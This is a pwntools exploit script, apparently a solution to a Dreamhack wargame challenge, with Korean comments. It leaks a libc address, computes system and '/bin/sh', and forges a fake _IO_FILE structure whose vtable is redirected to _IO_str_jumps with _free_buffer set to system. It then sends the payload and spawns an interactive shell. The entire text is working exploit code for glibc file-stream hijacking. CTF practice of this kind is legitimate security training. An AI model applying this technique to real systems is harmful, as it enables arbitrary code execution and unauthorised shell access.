from pwn import *

# 서버 접속 및 libc 로드
p = remote('host1.dreamhack.games', 22826)
libc = ELF('./libc.so.6')

# 1. stdout 주소 Leak 및 libc base 계산
p.recvuntil(b"stdout: ")
stdout_leak = int(p.recvline().strip(), 16)
libc.address = stdout_leak - libc.sym['_IO_2_1_stdout_']

print(f"[+] stdout leak: {hex(stdout_leak)}")
print(f"[+] libc base: {hex(libc.address)}")

# 2. 필요한 주소 계산
system_addr = libc.sym['system']
binsh_addr = next(libc.search(b'/bin/sh'))
fake_lock = libc.bss()

# glibc 2.23 환경에서 _IO_str_jumps 심볼이 없는 경우 _IO_file_jumps + 0xc0 에 위치함
try:
    io_str_jumps = libc.sym['_IO_str_jumps']
except:
    io_str_jumps = libc.sym['_IO_file_jumps'] + 0xc0

print(f"[+] system: {hex(system_addr)}")
print(f"[+] /bin/sh: {hex(binsh_addr)}")
print(f"[+] _IO_str_jumps: {hex(io_str_jumps)}")

# 3. Fake _IO_FILE payload 구성 (총 0xf0 크기)
payload = p64(0)              # 0x00: _flags
payload += p64(0)             # 0x08: _IO_read_ptr
payload += p64(0)             # 0x10: _IO_read_end
payload += p64(0)             # 0x18: _IO_read_base
payload += p64(0)             # 0x20: _IO_write_base
payload += p64(0)             # 0x28: _IO_write_ptr
payload += p64(0)             # 0x30: _IO_write_end
payload += p64(binsh_addr)    # 0x38: _IO_buf_base (여기가 system의 인자가 됨)
payload += p64(0)             # 0x40: _IO_buf_end
payload += p64(0)             # 0x48: _IO_save_base
payload += p64(0)             # 0x50: _IO_backup_base
payload += p64(0)             # 0x58: _IO_save_end
payload += p64(0)             # 0x60: _markers
payload += p64(0)             # 0x68: _chain
payload += p32(0) + p32(0)    # 0x70: _fileno, _flags2
payload += p64(0)             # 0x78: _old_offset
payload += p16(0) + p8(0) + p8(0) + p32(0) # 0x80: _cur_column, _vtable_offset 등 패딩
payload += p64(fake_lock)     # 0x88: _lock (valid writable address)
payload += p64(0)             # 0x90: _offset
payload += p64(0)             # 0x98: _codecvt
payload += p64(0)             # 0xa0: _wide_data
payload += p64(0)             # 0xa8: _freeres_list
payload += p64(0)             # 0xb0: _freeres_buf
payload += p64(0)             # 0xb8: __pad5
payload += p32(0) + p32(0)    # 0xc0: _mode, unused2
payload += p64(0)             # 0xc8: unused2
payload += p64(0)             # 0xd0: unused2
payload += p64(io_str_jumps)  # 0xd8: vtable 포인터 변조
payload += p64(0)             # 0xe0: _allocate_buffer (바이너리 검증 우회용 0)
payload += p64(system_addr)   # 0xe8: _free_buffer (목표 함수 system)

# 4. 페이로드 전송 및 쉘 획득
p.recvuntil(b"Data: ")
p.send(payload)

p.interactive()